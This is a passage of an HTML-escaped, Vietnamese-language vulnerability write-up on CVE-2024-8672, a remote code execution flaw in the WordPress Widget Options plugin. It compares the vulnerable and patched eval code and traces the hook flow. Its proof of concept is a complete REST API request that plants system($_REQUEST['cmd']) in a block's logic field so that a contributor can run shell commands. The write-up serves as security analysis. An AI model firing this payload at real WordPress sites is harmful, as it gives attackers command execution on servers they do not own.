noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-options/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Options Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Options&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.7&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v4.0.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) eval(&amp;#34;return $expression;&amp;#34;);&#xA;    } catch (Throwable $e) {&#xA;        return false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ h√†m &lt;code&gt;widgetopts_safe_eval&lt;/code&gt; cho ph√©p th·ª±c thi l·ªánh b·∫•t k·ª≥ th√¥ng qua &lt;code&gt;eval&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v4.1.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widgetopts_safe_eval($expression)&#xA;{&#xA;    if (widgetopts_is_widget_or_post_preview()) {&#xA;        // Always return true for previews unless the user is an administrator&#xA;        if (!current_user_can(&amp;#39;administrator&amp;#39;)) {&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    $validation_result = widgetopts_validate_expression($expression);&#xA;&#xA;    if ($validation_result[&amp;#39;valid&amp;#39;] === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    if (stristr($expression, &amp;#34;return&amp;#34;) === false) {&#xA;        $expression = &amp;#34;return (&amp;#34; . $expression . &amp;#34;);&amp;#34;;&#xA;    }&#xA;&#xA;    ob_start();&#xA;    try {&#xA;        $result = (bool) (@eval($expression));&#xA;    } catch (\Exception $e) {&#xA;        $result = false;&#xA;    } catch (\Error $e) {&#xA;        $result = false;&#xA;    } catch (\ParseError $e) {&#xA;        $result = false;&#xA;    } catch (\Throwable $e) {&#xA;        $result = false;&#xA;    }&#xA;    ob_end_clean();&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ validate &lt;code&gt;$expression&lt;/code&gt; b·∫±ng c√°ch g·ªçi h√†m &lt;code&gt;widgetopts_validate_expression&lt;/code&gt;(&lt;a href=&#34;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534&lt;/a&gt;)&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin n√†y ƒëƒÉng k√Ω m·ªôt &lt;strong&gt;filter hook&lt;/strong&gt; v√†o &lt;code&gt;render_block&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, function ($block_content, $parsed_block, $obj) {&#xA;    if (!is_admin()) {&#xA;        add_filter(&amp;#34;render_block_{$obj-&amp;gt;name}&amp;#34;, &amp;#34;blockopts_filter_before_display&amp;#34;, 100, 3);&#xA;    }&#xA;    return $block_content;&#xA;}, 100, 3);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;render_block&lt;/code&gt; ƒë∆∞·ª£c k√≠ch ho·∫°t m·ªói khi m·ªôt block ƒë∆∞·ª£c render trong &lt;strong&gt;tr√¨nh ch·ªânh s·ª≠a m·∫∑c ƒë·ªãnh c·ªßa WordPress (Gutenberg)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng ·ªü m√¥i tr∆∞·ªùng qu·∫£n tr·ªã (&lt;code&gt;!is_admin()&lt;/code&gt;), plugin s·∫Ω g·∫Øn th√™m filter ri√™ng cho block hi·ªán t·∫°i (&lt;code&gt;render_block_{block_name}&lt;/code&gt;) ƒë·ªÉ x·ª≠ l√Ω n·ªôi dung tr∆∞·ªõc khi hi·ªÉn th·ªã b·∫±ng h√†m &lt;code&gt;blockopts_filter_before_display&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;function blockopts_filter_before_display($block_content, $parsed_block, $obj)&#xA;{&#xA;    ...&#xA;    if (isset($parsed_block) &amp;amp;&amp;amp; isset($parsed_block[&amp;#39;attrs&amp;#39;]) &amp;amp;&amp;amp; (isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts&amp;#39;]) || isset($parsed_block[&amp;#39;attrs&amp;#39;][&amp;#39;extended_widget_opts_block&amp;#39;]))) {&#xA;        ...&#xA;        if (&amp;#39;activate&amp;#39; == $widget_options[&amp;#39;logic&amp;#39;]) {&#xA;&#x9;&#x9;&#x9;// display widget logic&#xA;&#x9;&#x9;&#x9;if (isset($opts[&amp;#39;class&amp;#39;]) &amp;amp;&amp;amp; isset($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]) &amp;amp;&amp;amp; !empty($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;])) {&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = stripslashes(trim($opts[&amp;#39;class&amp;#39;][&amp;#39;logic&amp;#39;]));&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = apply_filters(&amp;#39;extended_widget_options_logic_override_block&amp;#39;, $display_logic);&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === false) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;if ($display_logic === true) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return true;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;// if (stristr($display_logic, &amp;#34;return&amp;#34;) === false) {&#xA;&#x9;&#x9;&#x9;&#x9;// &#x9;$display_logic = &amp;#34;return (&amp;#34; . $display_logic . &amp;#34;);&amp;#34;;&#xA;&#x9;&#x9;&#x9;&#x9;// }&#xA;&#x9;&#x9;&#x9;&#x9;$display_logic = htmlspecialchars_decode($display_logic, ENT_QUOTES);&#xA;&#x9;&#x9;&#x9;&#x9;if (!widgetopts_safe_eval($display_logic)) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;return false;&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;D√≤ng 4 ki·ªÉm tra ƒëi·ªÅu ki·ªán &lt;code&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/code&gt; c√≥ ƒë∆∞·ª£c b·∫≠t hay ch∆∞a, ta b·∫≠t n√≥ trong Admin Dashboard&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#34; title=&#34;B·∫≠t Gutenberg Page &amp;amp; Post Block Options&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;enable&lt;/h2&gt;&lt;p&gt;B·∫≠t Gutenberg Page &amp;amp; Post Block Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/enable.png&#39; alt=&#34;enable&#34; height=&#34;670&#34; width=&#34;1676&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫≠t Gutenberg Page &amp; Post Block Options&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû d√≤ng 6 v√† d√≤ng 8, ƒëo·∫°n m√£ ki·ªÉm tra xem tr∆∞·ªùng &lt;strong&gt;logic&lt;/strong&gt; c√≥ t·ªìn t·∫°i v√† kh√¥ng r·ªóng. N·∫øu ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng, h√†m &lt;code&gt;widgetopts_safe_eval($display_logic)&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi, d·∫´n ƒë·∫øn vi·ªác th·ª±c thi b·∫•t k·ª≥ l·ªánh n√†o ƒë∆∞·ª£c truy·ªÅn v√†o.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#34; title=&#34;Tr∆∞·ªùng logic khi submit post&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/logic.png&#34; data-sub-html=&#34;&lt;h2&gt;Logic&lt;/h2&gt;&lt;p&gt;Tr∆∞·ªùng logic khi submit post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/logic.png&#39; alt=&#34;Logic&#34; height=&#34;723&#34; width=&#34;774&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tr∆∞·ªùng logic khi submit post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y, khi s·ª≠ d·ª•ng &lt;strong&gt;Contributor&lt;/strong&gt; account ƒë·ªÉ t·∫°o post, tr∆∞·ªùng logic ƒë√£ xu·∫•t hi·ªán trong request v·ªõi gi√° tr·ªã l√† &lt;code&gt;payload&lt;/code&gt;. Ta ho√†n to√†n c√≥ th·ªÉ ki·ªÉm so√°t tr∆∞·ªùng n√†y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker has a Contributor (or higher) account&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Creates or edits a post using Gutenberg&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Inserts malicious PHP into the &amp;#39;Logic&amp;#39; field (extended_widget_opts)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Payload is saved in block attributes&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;render_block hook is triggered&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;blockopts_filter_before_display() is executed&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;widgetopts_safe_eval() is called&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;eval() executes the attacker‚Äôs payload&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Remote Code Execution on the server&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng Administrator account b·∫≠t option &lt;strong&gt;Gutenberg Page &amp;amp; Post Block Options&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o post v·ªõi Contributor account:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /index.php/wp-json/wp/v2/posts/170?_locale=user&amp;amp;cmd=ls&amp;#43;/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;{&amp;#34;id&amp;#34;:170,&amp;#34;title&amp;#34;:&amp;#34;testing&amp;#34;,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph {\&amp;#34;atts\&amp;#34;:{\&amp;#34;id_base\&amp;#34;:-1,\&amp;#34;column\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;12\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;12\&amp;#34;},\&amp;#34;alignment\&amp;#34;:{\&amp;#34;desktop\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;tablet\&amp;#34;:\&amp;#34;default\&amp;#34;,\&amp;#34;mobile\&amp;#34;:\&amp;#34;default\&amp;#34;},\&amp;#34;roles\&amp;#34;:{\&amp;#34;state\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;visibility\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;acf\&amp;#34;:{\&amp;#34;visibility\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;field\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;condition\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;value\&amp;#34;:\&amp;#34;\&amp;#34;}},\&amp;#34;author_page\&amp;#34;:{\&amp;#34;author_pages\&amp;#34;:{\&amp;#34;selections\&amp;#34;:\&amp;#34;1\&amp;#34;}},\&amp;#34;devices\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;days\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;},\&amp;#34;dates\&amp;#34;:{\&amp;#34;options\&amp;#34;:\&amp;#34;hide\&amp;#34;,\&amp;#34;from\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;to\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;styling\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;bg_image\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;heading\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;links_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_input\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;background_submit_hover\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;text_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_color_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_type_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;border_width_submit\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;list_border_color\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;table_border_color\&amp;#34;:\&amp;#34;\&amp;#34;},\&amp;#34;class\&amp;#34;:{\&amp;#34;selected\&amp;#34;:\&amp;#34;0\&amp;#34;,\&amp;#34;link\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;id\&amp;#34;:\&amp;#34;a\&amp;#34;,\&amp;#34;classes\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;animation\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;event\&amp;#34;:\&amp;#34;enters\&amp;#34;,\&amp;#34;speed\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;offset\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;delay\&amp;#34;:\&amp;#34;\&amp;#34;,\&amp;#34;logic\&amp;#34;:\&amp;#34;system($_REQUEST[\&amp;#34;cmd\&amp;#34;])\&amp;#34;},\&amp;#34;tabselect\&amp;#34;:\&amp;#34;0\&amp;#34;},\&amp;#34;dateUpdated\&amp;#34;:123} --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-04-cve-2024-8672/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-04-cve-2024-8672/result.png&#39; alt=&#34;Result&#34; height=&#34;868&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;Widget Options &amp;lt;= 4.0.7&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng &lt;strong&gt;&lt;code&gt;eval()&lt;/code&gt; kh√¥ng an to√†n&lt;/strong&gt; trong t√≠nh nƒÉng &lt;strong&gt;display logic&lt;/strong&gt;. D·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t t·ª´ thu·ªôc t√≠nh block &lt;code&gt;extended_widget_opts&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o h√†m &lt;code&gt;widgetopts_safe_eval()&lt;/code&gt; m√† &lt;strong&gt;kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra, l·ªçc ho·∫∑c x√°c th·ª±c ƒë·∫ßy ƒë·ªß&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ &lt;strong&gt;x√°c th·ª±c&lt;/strong&gt; v·ªõi quy·ªÅn &lt;strong&gt;Contributor (ho·∫∑c cao h∆°n)&lt;/strong&gt; ch√®n v√† th·ª±c thi m√£ PHP t√πy √Ω trong qu√° tr√¨nh render block, d·∫´n ƒë·∫øn 